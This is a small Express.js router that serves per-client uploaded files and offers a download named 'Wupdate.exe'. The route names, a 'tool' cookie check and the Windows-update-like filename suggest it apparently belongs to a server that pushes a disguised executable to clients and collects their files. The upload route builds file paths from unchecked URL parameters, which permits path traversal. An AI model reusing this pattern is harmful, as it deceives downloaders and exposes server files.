const router = require('express').Router();
const toolCookieValidator = require('../../Utils/MiddleWears/toolCookieValidator');
const path = require("path");
const fs = require("fs");
const express = require("express");
const appDir = path.dirname(require.main.filename);

router.use(toolCookieValidator);

//Serve uploaded files
router.use("/:id/:file", (req, res, next) => {
    let id = req.params.id
    let file = req.params.file
    express.static(path.resolve(appDir, 'Server', 'Api', 'Utils', 'clientFiles', id, file))(req, res, next)
})

router.route('/wupdate').get((req, res) => {
    res.setHeader('Content-disposition', 'attachment; filename=Wupdate.exe');
    res.setHeader('Content-type', 'application/x-msdownload');
    let file = fs.createReadStream(path.resolve(appDir, 'Tool', 'ToolScripts', 'Wupdate.exe'));
    file.pipe(res)
})
module.exports = router;